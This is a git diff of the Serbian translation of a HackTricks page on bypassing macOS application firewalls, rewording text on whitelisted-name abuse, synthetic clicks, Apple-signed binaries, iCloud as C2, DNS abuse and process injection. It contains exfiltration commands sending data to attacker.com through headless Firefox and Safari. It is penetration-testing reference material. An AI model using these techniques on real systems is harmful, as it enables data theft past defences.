@@ -1,4 +1,4 @@
-# Bypassiranje firewalla na macOS-u
+# Bypassovanje macOS Firewall-a
 
 <details>
 
@@ -6,49 +6,49 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 ## Pronađene tehnike
 
-Sledeće tehnike su pronađene da rade u nekim macOS firewall aplikacijama.
+Navedene tehnike su pronađene da funkcionišu u nekim macOS firewall aplikacijama.
 
-### Zloupotreba imena na beloj listi
+### Zloupotreba imena na whitelisti
 
-* Na primer, nazivanje malicioznog softvera imenima dobro poznatih macOS procesa kao što je **`launchd`**&#x20;
+* Na primer, nazivanje malvera imenima poznatih macOS procesa poput **`launchd`**
 
-### Sintetički klik
+### Sintetički Klik
 
-* Ako firewall traži od korisnika dozvolu, maliciozni softver treba **kliknuti na dozvolu**
+* Ako firewall zatraži dozvolu od korisnika, naterajte malver da **klikne na dozvolu**
 
 ### **Korišćenje Apple potpisanih binarnih fajlova**
 
-* Kao što su **`curl`**, ali i drugi kao što je **`whois`**
+* Poput **`curl`**, ali i drugih poput **`whois`**
 
 ### Dobro poznati Apple domeni
 
-Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima kao što su **`apple.com`** ili **`icloud.com`**. iCloud se može koristiti kao C2.
+Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima poput **`apple.com`** ili **`icloud.com`**. iCloud bi mogao biti korišćen kao C2.
 
 ### Generički Bypass
 
-Neke ideje za pokušaj zaobilaženja firewalla
+Neke ideje za pokušaj zaobilaženja firewall-a
 
 ### Provera dozvoljenog saobraćaja
 
-Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno beloliste domene ili aplikacije kojima je dozvoljen pristup njima
+Znanje o dozvoljenom saobraćaju će vam pomoći da identifikujete potencijalno belistane domene ili koje aplikacije imaju dozvolu da im pristupe
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Zloupotreba DNS-a
 
-DNS rezolucije se vrše putem potpisanog aplikacije **`mdnsreponder`**, koja će verovatno biti dozvoljena da kontaktira DNS servere.
+DNS rezolucije se vrše putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (464).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
 ### Putem aplikacija pregledača
 
@@ -77,9 +77,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Putem ubrizgavanja procesa
+### Putem ubacivanja procesa
 
-Ako možete **ubrizgati kod u proces** koji je dozvoljen da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:
+Ako možete **ubaciti kod u proces** koji je dozvoljen da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -95,10 +95,10 @@ Ako možete **ubrizgati kod u proces** koji je dozvoljen da se poveže sa bilo k
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
